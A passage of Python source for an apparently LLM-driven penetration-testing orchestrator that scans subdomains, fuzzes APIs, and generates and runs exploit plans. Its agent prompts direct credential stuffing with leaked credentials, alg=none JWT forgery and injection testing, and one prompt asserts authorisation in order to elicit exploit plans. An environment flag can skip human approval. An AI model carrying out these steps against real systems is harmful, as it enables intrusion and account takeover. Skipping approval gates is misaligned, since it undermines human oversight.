                        still_dead.append(url)
            if not still_dead:
                break
            dead_urls = still_dead
        return recovered

    async def _probe_live_subdomains(self, urls: list) -> list:
        import httpx
        from urllib.parse import urlparse
        from core.security.authorization import TargetScopeValidator
        scope = TargetScopeValidator.get()

        async def _probe(url):
            host = urlparse(url).hostname or ""
            for scheme_url in (url, url.replace("https://", "http://")):
                try:
                    async with httpx.AsyncClient(verify=False, timeout=10, follow_redirects=True) as c:
                        r = await c.get(scheme_url, headers={"User-Agent": "Mozilla/5.0"})
                        final_host = urlparse(str(r.url)).hostname or host
                        # Redirects that leave authorised scope are marked
                        # EXTERNAL, not LIVE — we must not scan them.
                        if not scope.is_authorized(final_host):
                            return {"url": scheme_url, "host": host,
                                    "status": r.status_code,
                                    "final_host": final_host,
                                    "tier": "EXTERNAL",
                                    "score": -1,
                                    "note": f"redirects to out-of-scope host {final_host}"}
                        body_len = len(r.content or b"")
                        # A 5xx (Heroku sleeping dyno, S3 500, etc.) is DEAD
                        # for full-scan purposes — takeover-only check is worth
                        # doing but nuclei/sqlmap/dalfox against an error page
                        # is pure noise.
                        if r.status_code >= 500:
                            return {"url": scheme_url, "host": host,
                                    "status": r.status_code,
                                    "final_host": final_host,
                                    "tier": "DEAD", "len": body_len,
                                    "score": 0,
                                    "note": f"HTTP {r.status_code} on first hit"}
                        # LIVE: prefer 200s with substantial app content.
                        score = body_len + (5000 if r.status_code == 200 else 0)
                        return {"url": scheme_url, "host": host,
                                "status": r.status_code,
                                "final_host": final_host,
                                "tier": "LIVE", "len": body_len,
                                "score": score}
                except Exception:
                    continue
            # No response on either scheme → DEAD (DNS-fail / timeout).
            return {"url": url, "host": host, "status": 0,
                    "tier": "DEAD", "len": 0, "score": 0,
                    "note": "no response on https/http"}

        results = await asyncio.gather(*(_probe(u) for u in urls), return_exceptions=True)
        graded = [r for r in results if isinstance(r, dict) and r]
        graded.sort(key=lambda x: x.get("score", 0), reverse=True)
        live = [r for r in graded if r.get("tier") == "LIVE"]
        dead = [r for r in graded if r.get("tier") == "DEAD"]
        external = [r for r in graded if r.get("tier") == "EXTERNAL"]
        logger.info(
            f"[SubdomainScan] Liveness: {len(live)} live, {len(dead)} dead, "
            f"{len(external)} external-redirect; live=("
            f"{', '.join(l['host'] for l in live[:10])})"
        )
        # Retain the tiers on ctx so the UI / notifications can show them.
        try:
            self.ctx.subdomain_tiers = {
                "live": [r["host"] for r in live],
                "dead": [r["host"] for r in dead],
                "external": [r["host"] for r in external],
            }
        except Exception:
            pass
        # Expose the dead tier so `_scan_subdomain_endpoints` can run a cheap
        # takeover-only pass instead of skipping them entirely.
        self._subdomain_dead_tier = dead
        self._subdomain_external_tier = external
        return live

    async def _scan_subdomain_endpoints(self):
        from core.common.config import get_config as _cfg
        subdomains = getattr(self.ctx, 'subdomains', []) or []
        if not subdomains:
            logger.info("[SubdomainScan] No subdomains discovered — skipping endpoint enumeration")
            return

        from urllib.parse import urlparse
        base = urlparse(self.ctx.target)
        base_host = base.hostname or ""

        candidates = []
        for sub in subdomains:
            sub_clean = sub.strip().lower().rstrip(".")
            if not sub_clean or sub_clean == base_host:
                continue
            if "://" in sub_clean:
                sub_clean = urlparse(sub_clean).hostname or sub_clean
            candidates.append(f"https://{sub_clean}")
        candidates = sorted(set(candidates))

        if not candidates:
            logger.info("[SubdomainScan] All subdomains match primary target — skipping")
            return

        # Probe liveness and keep only live in-scope instances, best-first.
        live = await self._probe_live_subdomains(candidates)
        # Expert mode: any host we marked dead is re-probed with warm-up delays.
        # Heroku / App Engine / Cloud Run dynos routinely sleep and 503 on first
        # touch — an expert wouldn't skip them without a real check.
        live_urls = {l["url"] for l in live}
        dead = [u for u in candidates if u not in live_urls]
        if dead:
            recovered = await self._reprobe_sleeping_hosts(dead)
            for r in recovered:
                live.append(r)
        if not live:
            logger.info("[SubdomainScan] No live subdomains to test")
            return

        # Per-scan subdomain budget. Two knobs, both bounded so a target with
        # 50+ subdomains cannot burn the entire LLM budget before SCAN/EXPLOIT.
        #   MAX_SUBDOMAIN_SCANS    — hard cap on how many LIVE subdomains get
        #                            the deep 60-round treatment. 0 means "no
        #                            cap" (previous behaviour) but the default
        #                            is now 6 so the scan actually progresses
        #                            past recon on wide targets.
        #   MAX_DEAD_SUBDOMAIN_CHECKS — how many DEAD hosts get a cheap 3-round
        #                            takeover-only pass. Default 20 — enough
        #                            to cover every practical takeover surface
        #                            without wasting rounds nuclei-scanning
        #                            stock error pages.
        cap = _cfg().get_int("MAX_SUBDOMAIN_SCANS", 6)
        dead_cap = _cfg().get_int("MAX_DEAD_SUBDOMAIN_CHECKS", 20)
        deep = _cfg().get_bool("SUBDOMAIN_DEEP_SCAN", True)
        if cap > 0:
            targets = [l["url"] for l in live[:cap]]
            if len(live) > cap:
                logger.info(f"[SubdomainScan] Capping to {cap} of {len(live)} live subdomains "
                            f"(MAX_SUBDOMAIN_SCANS=0 to test all)")
        else:
            targets = [l["url"] for l in live]
            logger.info(f"[SubdomainScan] Expert mode: testing all {len(live)} live subdomains (no cap)")

        # Enqueue DEAD hosts with a 3-round takeover-only objective. The
        # takeover_detector guards against Heroku sleep-page false positives
        # so this is cheap AND correct.
        dead_tier = getattr(self, "_subdomain_dead_tier", []) or []
        external_tier = getattr(self, "_subdomain_external_tier", []) or []
        dead_targets: list[str] = []
        if dead_tier and dead_cap != 0:
            picks = dead_tier if dead_cap < 0 else dead_tier[:dead_cap]
            dead_targets = [d["url"] for d in picks]
            logger.info(f"[SubdomainScan] Queueing {len(dead_targets)} dead subdomain(s) "
                        f"for takeover-only check (3 rounds each)")
        if external_tier:
            logger.info(f"[SubdomainScan] Dropping {len(external_tier)} out-of-scope "
                        f"redirect(s): {', '.join(e['host'] for e in external_tier[:5])}"
                        f"{'…' if len(external_tier) > 5 else ''}")

        logger.info(f"\n>>> PHASE 1b: LIVE SUBDOMAIN TESTING ({len(targets)} instances, "
                    f"{'comprehensive' if deep else 'recon-only'})")

        from core.security.authorization import TargetScopeValidator, AuthContext
        scope = TargetScopeValidator.get()
        for t in targets:
            scope.add_target(urlparse(t).hostname)

        allowed_tools = list(self.tools.tools.keys()) if hasattr(self, 'tools') and hasattr(self.tools, 'tools') else []
        auth_context = AuthContext(
            allowed_tools=allowed_tools,
            has_elevated_privilege=True,
            target_profile=getattr(self, 'target_profile', None),
        )

        from agents.llm_harness_adapter import get_llm, initialize_llm
        llm_harness = get_llm()
        if llm_harness is None:
            try:
                await initialize_llm()
            except Exception:
                logger.warning("[SubdomainScan] LLM init failed — skipping subdomain enumeration")
                return
            llm_harness = get_llm()
            if llm_harness is None:
                logger.warning("[SubdomainScan] LLM harness unavailable — skipping")
                return

        # Expert mode: fan subdomain scans out in parallel with a bounded
        # semaphore. Depth per-scan is unchanged (each scan is still exhaustive)
        # — we just no longer wait for subdomain N-1 to finish before starting N.
        from core.orchestration.parallel_agents import run_parallel_agents, AgentTracker
        subdomain_concurrency = _cfg().get_int("SUBDOMAIN_SCAN_CONCURRENCY", 3)

        async def _scan_one(sub_url: str, tier: str = "LIVE"):
            sub_host = urlparse(sub_url).hostname
            logger.info(f"[SubdomainScan] Scanning endpoints on {sub_host} (tier={tier})")
            if tier == "DEAD":
                # Dead-tier scan: takeover-only. Full nuclei/sqlmap against a
                # stock error page produces zero real findings and burns 60
                # rounds of LLM budget. The takeover_detector already fires
                # from the AgenticExecutor auto-analyzer on the very first
                # response, so a 3-round budget is enough to (a) do the DNS
                # CNAME check, (b) try HTTP if HTTPS 5xx-ed, (c) record the
                # verdict.
                objective = (
                    f"Perform a subdomain-takeover check ONLY on {sub_url}. This host "
                    f"returned an error on first probe, so a full scan would waste budget. "
                    f"Steps:\n"
                    f"1) One HTTP + one HTTPS GET to capture the body.\n"
                    f"2) dig CNAME {sub_host} — is there a dangling CNAME into "
                    f".herokuapp.com / .github.io / .s3.amazonaws.com / .azurewebsites.net / .netlify.app?\n"
                    f"3) Record the verdict via analyze_results. If no CNAME dangles, "
                    f"there is no takeover — stop.\n"
                    f"IMPORTANT: Do NOT run nuclei / nikto / sqlmap / dalfox / ffuf here."
                )
                rounds = 3
            elif deep:
                objective = (
                    f"Comprehensively security-test the live instance {sub_url} "
                    f"(a subdomain of {base_host}, in authorized scope). Treat it as a "
                    "full target, not just recon:\n"
                    "1) Crawl and map endpoints (katana), fingerprint tech (whatweb/httpx), "
                    "content-discover paths (ffuf/gobuster on /api/FUZZ, /rest/FUZZ, /FUZZ).\n"
                    "2) Run nuclei (severity critical,high,medium) and nikto for known vulns/misconfig.\n"
                    "3) Test injection on discovered parameters: SQLi (sqlmap on ?q=/search/id params), "
                    "XSS (dalfox), command injection.\n"
                    "4) Check auth/access-control: default creds, IDOR on object ids, missing auth on "
                    "/api and /rest endpoints, security headers, CORS.\n"
                    "5) Attempt to demonstrate and report each real vulnerability with evidence.\n"
                    f"IMPORTANT: Only interact with {sub_url} — stay in scope."
                )
                rounds = 60   # expert mode — deep drilling, novel attack chaining
            else:
                objective = (
                    f"Perform endpoint discovery and technology fingerprinting on {sub_url}. "
                    "1) katana crawl. 2) ffuf/gobuster on common paths. 3) nikto. "
                    "4) whatweb/httpx fingerprint. 5) Find exposed API/admin/login. "
                    f"IMPORTANT: Only scan {sub_url} — stay in scope."
                )
                rounds = 35

            try:
                executor = AgenticExecutor(
                    llm_harness=llm_harness,
                    tool_invocation_engine=self.tool_invocation_engine,
                    shared_context=self.ctx,
                    auth_context=auth_context,
                )
                # Pre-attach a tracker with the subdomain-specific id so the UI
                # sees one card per host instead of them all collapsing into
                # "subdomain_scan_*".
                executor._tracker = AgentTracker(
                    self._scan_id, agent_id=f"sub:{sub_host}",
                    label=sub_host, phase="subdomain_scan", target=sub_url)
                result = await executor.execute(
                    objective=objective,
                    phase=f"subdomain_scan_{sub_host}",
                    max_rounds=rounds,
                )
                if isinstance(result, dict):
                    findings = result.get("findings", [])
                    steps = result.get("steps", 0)
                elif hasattr(result, "findings"):
                    findings = result.findings
                    steps = getattr(result, "steps_taken", 0)
                else:
                    findings = []
                    steps = 0
                logger.info(f"[SubdomainScan] {sub_host}: {len(findings)} findings, {steps} steps")

                for f in findings:
                    if isinstance(f, dict):
                        f.setdefault("location", sub_url)
                        f.setdefault("target", sub_host)
                        f.setdefault("instance", sub_host)
                    if hasattr(self.ctx, 'add_vulnerability'):
                        self.ctx.add_vulnerability(f)

                try:
                    self._write_live_results()
                except Exception:
                    pass

            except Exception as e:
                logger.warning(f"[SubdomainScan] {sub_host} scan failed (non-fatal): {e}")

        await run_parallel_agents(targets, _scan_one,
                                    concurrency=subdomain_concurrency,
                                    label="SubdomainScan")

        if dead_targets:
            # Wrap the tier tag so `run_parallel_agents` still gets a single-arg
            # callable while `_scan_one` receives tier="DEAD".
            async def _scan_one_dead(sub_url: str):
                return await _scan_one(sub_url, tier="DEAD")
            await run_parallel_agents(dead_targets, _scan_one_dead,
                                        concurrency=subdomain_concurrency,
                                        label="SubdomainScan.dead")

        logger.info(f"[SubdomainScan] Completed testing {len(targets)} live subdomains "
                    f"and {len(dead_targets)} dead-tier takeover checks")
        try:
            self._write_live_results()
        except Exception:
            pass

    async def _run_sast_pipeline(self) -> None:
        from core.analysis.source_extractor import (
            extract_exposed_git, rehydrate_sourcemap, run_semgrep)
        from core.analysis.codeql_runner import run_codeql, llm_review_finding

        scan_id = getattr(self, "_scan_id", None) or "unscoped"
        base = getattr(self.ctx, "target", None)
        if not base:
            return

        source_trees = []
        # 3.1 — git leak
        exposed = any(
            "/.git/" in str(v.get("location", ""))
            or "git config" in str(v.get("title", "")).lower()
            for v in (self.ctx.vulnerabilities or []))
        if exposed:
            tree = extract_exposed_git(base, scan_id)
            if tree:
                source_trees.append(tree)
        # 3.2 — sourcemap rehydration for every same-origin bundle
        try:
            base_host = str(base).split("/")[2] if "://" in base else base
        except Exception:
            base_host = ""
        for js_url in list(getattr(self.ctx, "js_bundles", []) or [])[:20]:
            if base_host and base_host not in js_url:
                continue
            tree = rehydrate_sourcemap(js_url, scan_id)
            if tree:
                source_trees.append(tree)

        if not source_trees:
            logger.info("[SAST] no source recovered — skipping semgrep/codeql")
            return

        for tree in source_trees:
            # 3.3 — semgrep
            findings = run_semgrep(tree)
            # 3.4 — codeql (best-effort)
            try:
                findings.extend(run_codeql(tree))
            except Exception as e:
                logger.debug(f"[SAST] codeql failed: {e}")
            logger.info(f"[SAST] {tree}: {len(findings)} raw findings")
            # 3.5 — hand each to the LLM code reviewer, cap so we don't
            # overspend the LLM budget on a huge tree.
            for f in findings[:50]:
                if hasattr(self.ctx, "add_vulnerability"):
                    self.ctx.add_vulnerability(f)
                try:
                    proposal = await llm_review_finding(f, tree)
                    if proposal:
                        # Publish the proposed exploit as a note on the
                        # scratchpad so the ExploitPhase picks it up.
                        try:
                            from core.orchestration.agent_scratchpad import get_scratchpad
                            pad = get_scratchpad(scan_id, "sast-reviewer")
                            pad.post("tool", proposal, topic="sast_exploit_proposal")
                        except Exception:
                            pass
                except Exception as e:
                    logger.debug(f"[SAST] LLM review failed for {f.get('rule_id')}: {e}")

    async def _prime_framework_corpus(self) -> None:
        try:
            from core.intelligence.framework_corpus import lookup_all
        except Exception:
            return
        fps: list = []
        # Pull fingerprint strings from wherever RECON stashed them.
        tp = getattr(self, "target_profile", None)
        if tp:
            for attr in ("technologies", "server", "framework", "cms", "waf"):
                v = getattr(tp, attr, None) or []
                if isinstance(v, (list, tuple, set)):
                    fps.extend(str(x) for x in v)
                elif v:
                    fps.append(str(v))
        # Response-header fingerprints (x-powered-by etc.) recorded on ctx.
        for h in list(getattr(self.ctx, "server_headers", {}) or {}).items():
            fps.append(f"{h[0]}: {h[1]}")
        quirks = lookup_all(fps)
        if quirks:
            self.ctx.framework_quirks = quirks
            logger.info(f"[FrameworkCorpus] loaded {len(quirks)} quirk(s) for stacks "
                        f"in {fps[:5]}")
        else:
            logger.info(f"[FrameworkCorpus] no quirks matched fingerprints "
                        f"({len(fps)} stacks checked)")

    async def _run_bundle_and_dom_analysis(self) -> None:
        base = getattr(self.ctx, "target", None) or getattr(self, "target", None)
        if not base:
            return
        try:
            from core.exploitation.js_bundle_analyzer import analyze_bundles
            routes = await analyze_bundles(self.ctx, base)
            if routes:
                logger.info(f"[BundleAnalyzer] extracted {len(routes)} route(s) from JS bundles")
        except Exception as e:
            logger.debug(f"[BundleAnalyzer] skipped: {e}")
        try:
            from core.exploitation.dom_sink_monitor import run_dom_sink_monitor
            findings = await run_dom_sink_monitor(self.ctx, base)
            for f in findings or []:
                if isinstance(f, dict):
                    f.setdefault("phase", "recon")
                    f.setdefault("tool", "dom_sink_monitor")
                    if hasattr(self.ctx, "add_vulnerability"):
                        self.ctx.add_vulnerability(f)
            logger.info(f"[DOMSinkMonitor] found {len(findings or [])} client-side sink hit(s)")
        except Exception as e:
            logger.debug(f"[DOMSinkMonitor] skipped: {e}")

    async def _run_semantic_fuzz_with_coverage(self) -> None:
        try:
            from core.exploitation.semantic_api_fuzzer import run_semantic_fuzz
            from core.exploitation.coverage_tracker import CoverageTracker
        except Exception as e:
            logger.debug(f"[SemanticFuzz] import failed: {e}")
            return
        if not getattr(self.ctx, "captured_requests", None):
            if getattr(self.ctx, "browser_status", "") == "UNAVAILABLE":
                logger.info("[SemanticFuzz] captured_requests UNAVAILABLE (browser missing) "
                            "— not a negative result; skipping")
            else:
                logger.info("[SemanticFuzz] no captured_requests — skipping")
            return
        tracker = CoverageTracker()
        # Expose the tracker to the fuzzer via ctx so it can filter blind
        # mutations. The fuzzer treats a missing tracker as no-op.
        self.ctx.coverage_tracker = tracker
        findings = await run_semantic_fuzz(self.ctx)
        for f in findings or []:
            if isinstance(f, dict):
                f.setdefault("phase", "exploit")
                f.setdefault("tool", "semantic_api_fuzzer")
                if hasattr(self.ctx, "add_vulnerability"):
                    self.ctx.add_vulnerability(f)
        logger.info(f"[SemanticFuzz] {len(findings or [])} finding(s); "
                    f"coverage across {len(tracker._buckets)} endpoint bucket(s)")

    async def _run_format_probes(self) -> None:
        try:
            from core.exploitation.format_probes import available_probes, get_probe
            from core.orchestration.agent_scratchpad import get_scratchpad
        except Exception as e:
            logger.debug(f"[FormatProbes] import failed: {e}")
            return
        scan_id = getattr(self, "_scan_id", None) or "unscoped"
        # Filter to endpoints that look like uploads or dataset-preview surfaces.
        endpoints = list(getattr(self.ctx, "endpoints", []) or [])
        upload_eps = [e for e in endpoints
                      if any(k in str(e).lower()
                             for k in ("upload", "dataset", "preview",
                                       "import", "attachment", "file"))]
        if not upload_eps:
            logger.info("[FormatProbes] no upload/preview endpoints — skipping")
            return
        pad = get_scratchpad(scan_id, "format-probes")
        probes = available_probes()
        logger.info(f"[FormatProbes] queueing {len(probes)} probe(s) × "
                    f"{len(upload_eps)} endpoint(s)")
        for probe_name in probes:
            try:
                probe = get_probe(probe_name)()
            except Exception as e:
                logger.debug(f"[FormatProbes] probe {probe_name} build failed: {e}")
                continue
            if not probe.get("payload"):
                continue
            for ep in upload_eps[:5]:
                pad.post("tool", {
                    "probe": probe_name,
                    "endpoint": str(ep),
                    "filename": probe.get("filename"),
                    "mime": probe.get("mime"),
                    "sink_signature": probe.get("sink_signature", []),
                    "rationale": probe.get("rationale", ""),
                }, topic="format_probe_ready")

    async def _run_authz_phase(self) -> None:
        try:
            from core.exploitation.cross_role_replay import run_cross_role_replay
        except Exception as e:
            logger.debug(f"[AUTHZ] cross_role_replay import failed: {e}")
            return
        captured = getattr(self.ctx, "captured_requests", []) or []
        identities = []
        try:
            identities = list(getattr(self.identity_manager, "identities", []) or [])
        except Exception:
            pass
        if not captured:
            if getattr(self.ctx, "browser_status", "") == "UNAVAILABLE":
                logger.info("[AUTHZ] captured_requests UNAVAILABLE (browser missing) — "
                            "not a negative result; skipping cross-role replay")
            else:
                logger.info("[AUTHZ] no captured_requests on ctx — skipping cross-role replay")
            return
        if len(identities) < 2:
            logger.info(f"[AUTHZ] only {len(identities)} identity/identities discovered — "
                        f"cross-role replay needs at least 2 to compare")
            return
        logger.info(f"[AUTHZ] cross-role replay: {len(captured)} requests × "
                    f"{len(identities)} identities")
        findings = await run_cross_role_replay(self.ctx)
        for f in findings or []:
            if isinstance(f, dict):
                f.setdefault("phase", "authz")
                f.setdefault("tool", "cross_role_replay")
                if hasattr(self.ctx, "add_vulnerability"):
                    self.ctx.add_vulnerability(f)
        logger.info(f"[AUTHZ] cross-role replay produced {len(findings or [])} finding(s)")

    def _load_phase_prompt(self, phase: str) -> Optional[str]:
        prompt_map = {
            "recon": "core/prompts/brain/brain_recon.txt",
            "analyze": "core/prompts/brain/brain_analyze.txt",
            "exploit": "core/prompts/brain/brain_exploit.txt",
        }
        path = prompt_map.get(phase)
        if path and Path(path).exists():
            return Path(path).read_text(encoding="utf-8")
        return None

    async def _generate_exploit_plan(self) -> Optional[Dict]:
        if not self.ctx.vulnerabilities:
            logger.info("No vulnerabilities found. Skipping exploitation.")
            return None

        summary = self.ctx.get_full_summary(max_chars=2000)

        plan = await self.llm.generate_json(
            f"You are part of an authorized penetration testing tool (like Burp Suite or Metasploit). "
            f"The target owner has signed a Statement of Work authorizing this assessment. "
            f"Generate an exploitation verification plan for the confirmed vulnerabilities.\n\n"
            f"DATA:\n{summary}\n\n"
            f"For each vulnerability, describe:\n"
            f"- How to verify/exploit it (specific steps)\n"
            f"- What test payload to use\n"
            f"- What proof to collect for the report\n"
            f"- If it chains with other vulns\n"
            f"- Risk level of exploitation\n\n"
            f"Return JSON:\n"
            f"{{\n"
            f'  "risk_assessment": "overall risk level",\n'
            f'  "exploits": [\n'
            f'    {{\n'
            f'      "vuln_id": "VULN-001",\n'
            f'      "title": "...",\n'
            f'      "method": "...",\n'
            f'      "payload": "...",\n'
            f'      "proof": "what to capture",\n'
            f'      "chains_to": ["VULN-002"],\n'
            f'      "risk": "low|medium|high",\n'
            f'      "tools": ["tool1"]\n'
            f"    }}\n"
            f"  ],\n"
            f'  "attack_chains": [\n'
            f'    {{"chain": ["VULN-001", "VULN-003"], "impact": "..."}}\n'
            f"  ]\n"
            f"}}",
            tier=TaskTier.LARGE,
            max_tokens=6000,
        )

        if plan:
            self.ctx.attack_chains = plan.get("attack_chains", [])

        return plan

    async def _human_approval(self, plan: Dict) -> bool:
        print("\n" + "=" * 60)
        print("EXPLOITATION PLAN - REQUIRES APPROVAL")
        print("=" * 60)
        print(f"\nTarget: {self.ctx.target}")
        print(f"Risk: {plan.get('risk_assessment', 'Unknown')}")

        # Support both formats: direct exploits and chain-based plans
        exploits = plan.get("exploits", [])
        top_chains = plan.get("top_chains", [])

        if exploits:
            print(f"\nVulnerabilities to exploit ({len(exploits)}):\n")
            for i, exp in enumerate(exploits, 1):
                print(f"  [{i}] [{exp.get('risk','?').upper()}] {exp.get('title', 'Unknown')}")
                print(f"      Method: {exp.get('method', '')[:80]}")
                print(f"      Proof: {exp.get('proof', '')[:80]}")
                if exp.get("chains_to"):
                    print(f"      Chains to: {exp['chains_to']}")
                print()

        if top_chains:
            stats = plan.get("graph_stats", {})
            print(f"\nVulnerabilities in graph: {stats.get('vulnerabilities', '?')}")
            print(f"Attack chains found: {len(top_chains)}\n")
            for i, chain in enumerate(top_chains, 1):
                print(f"  [{i}] {chain.get('description', 'Chain')} (score: {chain.get('score', '?'):.2f}, steps: {chain.get('steps', '?')})")
            print()
            suggestions = plan.get("next_exploit_suggestions", [])
            if suggestions:
                print("Next exploit suggestions:")
                for s in suggestions[:5]:
                    print(f"  - {s}")
                print()

        if not exploits and not top_chains:
            print(f"\nKnown vulnerabilities: {len(self.ctx.vulnerabilities)}")
            for i, v in enumerate(self.ctx.vulnerabilities[:10], 1):
                print(f"  [{i}] [{v.get('severity','?')}] {v.get('title', 'Unknown')} | {v.get('type', '')}")
            print()

        if plan.get("attack_chains"):
            print("Attack Chains:")
            for chain in plan["attack_chains"]:
                print(f"  {' -> '.join(chain.get('chain', []))}: {chain.get('impact', '')}")
            print()

        print("=" * 60)

        # Route the decision through the async escalation gate. In an attended
        # terminal this prompts y/n; when UNATTENDED_MODE is set it parks the
        # request in the approval queue and waits for an out-of-band decision
        # (resolver CLI / API / webhook), applying a safe default on timeout.
        # A legacy env auto-approve is still honoured for backward compatibility.
        try:
            import os as _os
            from core.security.consent import get_consent
            consent = get_consent()
            if consent.auto_approve or _os.environ.get("AUTO_APPROVE_EXPLOITS", "").lower() in ("1", "true", "yes"):
                logger.info("Plan AUTO-APPROVED (consent/env)")
                self.ctx.log_brain("Auto-approved exploitation plan", "plan_approved")
                return True
        except Exception:
            pass

        try:
            from core.escalation import get_escalation_gate, RiskLevel
            risk = RiskLevel.parse(plan.get("risk_assessment", "HIGH"), RiskLevel.HIGH)
            decision = await get_escalation_gate().request_approval(
                action="exploitation_plan",
                risk_level=risk,
                target=self.ctx.target,
                details={
                    "exploits": len(plan.get("exploits", [])),
                    "chains": len(plan.get("top_chains", [])),
                    "risk_assessment": plan.get("risk_assessment", "Unknown"),
                },
            )
            if decision.approved:
                logger.info(f"Plan APPROVED via escalation gate ({decision.status})")
                self.ctx.log_brain(f"Exploitation plan approved ({decision.status})", "plan_approved")
                return True
            logger.info(f"Plan REJECTED via escalation gate ({decision.status}: {decision.reason})")
            self.ctx.log_brain(f"Exploitation plan rejected ({decision.status})", "plan_rejected")
            return False
        except Exception as e:
            logger.warning(f"[Escalation] gate error, defaulting to DENY: {e}")
            self.ctx.log_brain("Exploitation plan denied (gate error)", "plan_rejected")
            return False

    async def _synthesize_and_detonate_exploits(self, max_exploits: int = 3) -> None:
        from core.exploitation.sandbox_detonator import ExploitSandbox
        from core.common.config import get_config as _cfg

        scope_validator = getattr(self, "scope_validator", None)
        sandbox = ExploitSandbox(
            llm_client=self.llm,
            scope_validator=scope_validator,
            timeout=_cfg().get_int("SANDBOX_TIMEOUT", 60),
        )
        # Prefer confirmed / high-severity findings.
        sev_rank = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        candidates = sorted(
            (v for v in self.ctx.vulnerabilities
             if str(v.get("severity", "INFO")).upper() in ("CRITICAL", "HIGH", "MEDIUM")),
            key=lambda v: sev_rank.get(str(v.get("severity", "INFO")).upper(), 4),
        )[:max_exploits]

        detonated = 0
        for finding in candidates:
            result = await sandbox.synthesize_and_detonate(
                finding, self.ctx.target, require_approval=True
            )
            if result.attempted:
                detonated += 1
                finding["sandbox_detonation"] = result.to_dict()
                if result.success:
                    finding["exploited"] = True
                    finding["confidence_score"] = min(0.98, float(finding.get("confidence_score", 0.75)) + 0.1)
                    self.ctx.exploit_results.append({
                        "title": finding.get("title"), "type": finding.get("type"),
                        "target": self.ctx.target, "sandbox": result.sandbox,
                        "proof_found": result.proof_found, "source": "sandbox_detonator",
                        "tool": "sandbox_detonator", "success": True,
                    })
                    logger.info(f"[Sandbox] PoC SUCCEEDED for '{finding.get('title')}' "
                                f"(proof={result.proof_found})")
            elif result.blocked_reason:
                logger.info(f"[Sandbox] skipped '{finding.get('title')}': {result.blocked_reason}")
        if detonated:
            logger.info(f"[Sandbox] detonated {detonated} synthesized exploits")

    async def _run_agent_exploitation(self) -> None:
        from core.actuation import ObjectiveAgentLoop
        from core.common.config import get_config as _cfg
        from agents.llm_harness_adapter import get_llm, initialize_llm

        harness = get_llm()
        if harness is None:
            await initialize_llm()
            harness = get_llm()
        if harness is None:
            logger.warning("[AgentExploit] no LLM harness available — skipping")
            return

        # Brief context from what recon/scanning already found.
        known = "; ".join(
            f"[{v.get('severity','?')}] {v.get('title', v.get('type','?'))}"
            for v in (self.ctx.vulnerabilities or [])[:8]
        )
        catalog = getattr(self.ctx, "endpoint_catalog", []) or []
        api_eps = [e["path"] for e in catalog if e.get("kind") in ("api", "sensitive")][:12]
        context = (f"Findings: {known or 'none yet'}. "
                   f"API/sensitive endpoints: {', '.join(api_eps) or 'none'}.")

        # Register leaked identities for authenticated IDOR/access-control testing.
        try:
            await self._augment_auth_with_osint()
        except Exception:
            pass

        # Feed OSINT into auth attacks, JWT forgery, and IDOR.
        try:
            idents = self._osint_identities()
            o_users = idents.get("usernames", [])
            o_creds = idents.get("leaked_pairs", [])
            emails = idents.get("emails", [])
            admin_emails = idents.get("admin_emails", [])
            o_pw = self._osint_spray_material()[2]
            if o_users or o_creds or emails:
                cred_hint = "; ".join(f"{u}:{p}" for u, p in o_creds[:8])
                admin_hint = ', '.join((admin_emails or emails)[:3]) or 'admin email'
                context += (
                    f"\nOSINT intel:\n"
                    f"Users: {', '.join(o_users[:15])}\n"
                    + (f"Emails: {', '.join(emails[:10])}\n" if emails else "")
                    + (f"Leaked creds: {cred_hint}\n" if cred_hint else "")
                    + (f"Passwords: {', '.join(o_pw[:8])}\n" if o_pw else "")
                    + "USE: 1) Credential stuff login endpoints. "
                    f"2) jwt_forge: sub/email={admin_hint}, role=admin, alg=none then HS256. "
                    "3) IDOR: access other users' objects via /api /rest endpoints.\n"
                )
        except Exception:
            pass

        objective = (
            f"Actively exploit the authorized target {self.ctx.target}. Confirm and "
            "demonstrate real vulnerabilities — authentication bypass, JWT flaws, IDOR / "
            "broken access control, injection, business-logic abuse, and client-side "
            "(DOM/CSP) issues via the browser. Chain requests and identities as needed. "
            "Call report_finding for each vulnerability you concretely demonstrate."
        )
        loop = ObjectiveAgentLoop(
            target=self.ctx.target, harness=harness,
            auth_headers=getattr(self.ctx, "auth_headers", None),
            max_steps=_cfg().get_int("AGENT_EXPLOIT_STEPS", 16),
            verifier=None,  # general targets have no benchmark oracle — evidence-driven
        )
        result = await loop.run(objective, context=context, category="exploitation",
                                scan_id=self._scan_id)
        for f in result.get("findings", []):
            self.ctx.add_vulnerability(f)
        logger.info(f"[AgentExploit] loop finished: {result.get('steps')} steps, "
                    f"{len(result.get('findings', []))} findings reported")

    def _analyze_cloud_privesc(self) -> None:
        from core.cloud.iam_privesc import CloudPrivescScanner
        from core.common.config import get_config as _cfg
        cfg = _cfg()

        iam_perms = None
        raw_perms = cfg.get("CLOUD_IAM_PERMISSIONS", "")
        if raw_perms:
            iam_perms = [p.strip() for p in raw_perms.split(",") if p.strip()]

        findings = CloudPrivescScanner().scan(
            iam_policy_file=cfg.get("CLOUD_IAM_POLICY_FILE") or None,
            iam_permissions=iam_perms,
            k8s_rbac_file=cfg.get("K8S_RBAC_FILE") or None,
            container_spec_file=cfg.get("CONTAINER_SPEC_FILE") or None,
            enumerate_live=cfg.get_bool("CLOUD_PRIVESC_LIVE", False),
        )
        for f in findings:
            self.ctx.add_vulnerability(f)
        if findings:
            logger.info(f"[CloudPrivesc] added {len(findings)} cloud privilege-escalation findings")

    async def _scan_modern_apis(self) -> None:
        from core.exploitation.modern_api import ModernAPIScanner

        # Collect candidate endpoint strings from context.
        endpoints: list = []
        raw_eps = getattr(self.ctx, "endpoints", {}) or {}
        for e in (raw_eps.keys() if isinstance(raw_eps, dict) else raw_eps):
            s = str(e)
            # endpoint ids may be "METHOD:url" — keep the url part.
            endpoints.append(s.split(":", 1)[1] if s[:7].upper().startswith(("GET:", "POST:")) else s)
        endpoints.extend(str(d) for d in (getattr(self.ctx, "directories", []) or []))
        for req in (getattr(self.ctx, "captured_requests", []) or []):
            if isinstance(req, dict) and req.get("url"):
                endpoints.append(str(req["url"]))

        grpc_targets = []
        for p in (getattr(self.ctx, "ports", []) or []):
            if isinstance(p, dict):
                svc = str(p.get("service", "")).lower()
                if "grpc" in svc or p.get("port") in (50051,):
                    host = p.get("host") or p.get("ip") or self.ctx.target
                    grpc_targets.append(f"{host}:{p.get('port')}")

        scanner = ModernAPIScanner(auth_headers=getattr(self.ctx, "auth_headers", None))
        findings = await scanner.scan(self.ctx.target, endpoints=endpoints, grpc_targets=grpc_targets)
        for f in findings:
